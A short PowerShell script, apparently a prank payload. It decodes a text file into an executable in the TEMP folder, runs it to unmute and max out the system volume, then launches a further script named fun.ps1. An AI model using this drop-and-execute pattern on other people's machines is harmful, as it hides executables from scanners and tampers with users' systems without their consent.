$SoundFun = Join-Path -Path $env:TEMP -ChildPath "soundfun.exe"
Convert-TextToBinary -Text (Get-Content .\SoundFun.txt) -OutputPath $SoundFun
Invoke-Expression "$SoundFun mutesysvolume 0"
Invoke-Expression "$SoundFun setsysvolume 65535"
.\fun.ps1